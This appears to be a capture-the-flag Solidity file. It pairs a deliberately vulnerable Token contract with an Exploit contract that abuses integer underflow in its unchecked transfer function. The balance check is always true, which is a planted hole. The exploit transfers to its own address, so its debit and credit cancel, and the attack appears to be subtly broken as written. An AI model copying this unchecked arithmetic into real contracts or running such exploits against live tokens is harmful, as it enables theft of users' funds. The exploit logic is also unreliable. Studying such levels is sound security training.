// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "exploit_templates/Destructible.sol";
import "exploit_templates/Targeted.sol";

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}

contract Exploit is Destructible, Targeted {
    constructor(address target_addr) payable Targeted(target_addr) {
    }
    function exploit() public payable {
        Token target = Token(Targeted(this).target());
        target.transfer(address(this), 21);
    }
}